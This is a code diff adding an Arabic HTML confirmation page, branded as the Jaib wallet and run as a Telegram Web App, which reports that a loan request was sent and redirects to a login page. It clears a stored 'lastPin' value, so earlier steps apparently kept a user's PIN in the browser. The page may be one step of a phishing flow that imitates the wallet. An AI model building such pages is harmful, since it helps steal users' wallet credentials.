@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تم إرسال الطلب - جيب (Jaib)</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <!-- ✅ Arabic Font (Tajawal) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --jaib-red: #D9142B;          /* Jaib Signature Crimson Red */
+            --jaib-red-dark: #B00E21;
+            --jaib-dark: #18181B;         /* Deep Charcoal Text */
+            --bg-color: #F7F7F8;
+            --card-bg: #FFFFFF;
+            --text-dark: #18181B;
+            --text-muted: #666666;
+            --soft-red-bg: #FFF5F6;
+            --soft-red-border: #FAD1D6;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            position: relative;
+            direction: rtl;
+        }
+
+        /* Top Floating Dark Toast Notification */
+        .toast-notification {
+            position: absolute;
+            top: 25px;
+            background-color: var(--jaib-dark);
+            color: #FFFFFF;
+            padding: 12px 20px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+            z-index: 100;
+            font-size: 14px;
+            font-weight: 700;
+            line-height: 1.4;
+        }
+
+        .toast-icon {
+            width: 24px;
+            height: 24px;
+            background-color: var(--jaib-red);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #FFFFFF;
+            font-size: 14px;
+            font-weight: 900;
+            flex-shrink: 0;
+        }
+
+        /* Main Card Container */
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 420px;
+            margin-top: 45px;
+            padding: 40px 24px 35px;
+            border-radius: 24px;
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.05);
+            border: 1px solid #F0F0F0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        /* Circle Checkmark Banner */
+        .check-circle {
+            width: 88px;
+            height: 88px;
+            background-color: var(--jaib-red);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 24px;
+            color: #FFFFFF;
+            font-size: 40px;
+            font-weight: 900;
+            box-shadow: 0 6px 22px rgba(217, 20, 43, 0.35);
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--text-dark);
+            margin: 0 0 16px;
+            font-weight: 900;
+        }
+
+        .message-text {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin: 0 0 14px;
+            line-height: 1.6;
+            max-width: 330px;
+        }
+
+        /* Redirection Container Button & Spinner */
+        .redirect-box {
+            background-color: var(--soft-red-bg);
+            border: 1px solid var(--soft-red-border);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin: 20px 0 16px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-dark);
+            font-weight: 800;
+            font-size: 15px;
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid #FAD1D6;
+            border-top: 2.5px solid var(--jaib-red);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Bottom Outline Action Button */
+        .btn-outline {
+            background-color: #FFFFFF;
+            color: var(--jaib-red);
+            border: 2px solid var(--jaib-red);
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        .btn-outline:hover {
+            background-color: var(--soft-red-bg);
+        }
+
+        .btn-outline:active {
+            background-color: var(--jaib-red);
+            color: #FFFFFF;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Top Floating Toast Notification -->
+<div class="toast-notification">
+    <div class="toast-icon">✓</div>
+    <div>🎉 تم إرسال طلبك<br>بنجاح!</div>
+</div>
+
+<!-- Card Container -->
+<div class="card">
+    <!-- Big Red Circle Indicator -->
+    <div class="check-circle">✓</div>
+
+    <!-- Title & Descriptions -->
+    <h1 class="main-title">تم إرسال الطلب</h1>
+
+    <p class="message-text">
+        تم إرسال طلب القرض الخاص بك بنجاح. يرجى الانتظار لحين مراجعته والموافقة عليه.
+    </p>
+
+    <p class="message-text">
+        ستصلك رسالة تأكيد قريباً. سجّل الدخول إلى محفظة جيب (Jaib) للمتابعة.
+    </p>
+
+    <!-- Redirect Countdown Box -->
+    <div class="redirect-box">
+        <div class="spinner"></div>
+        <span>جاري التحويل خلال <span id="timer">3</span> ثوانٍ...</span>
+    </div>
+
+    <!-- Secondary Login Button -->
+    <button type="button" class="btn-outline" onclick="goToPage6()">
+        تسجيل الدخول الآن
+    </button>
+</div>
+
+<script>
+    let timeLeft = 3;
+    let interval;
+
+    function updateTimer() {
+        const el = document.getElementById('timer');
+        if (el) el.textContent = timeLeft;
+    }
+
+    function goToPage6() {
+        if (interval) clearInterval(interval);
+
+        // Clear temporary PIN storage before redirecting
+        localStorage.removeItem('lastPin');
+        
+        window.location.href = "/page6";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        updateTimer();
+
+        interval = setInterval(() => {
+            timeLeft--;
+
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                goToPage6();
+                return;
+            }
+
+            updateTimer();
+        }, 1000);
+    };
+</script>
+
+</body>
+</html>
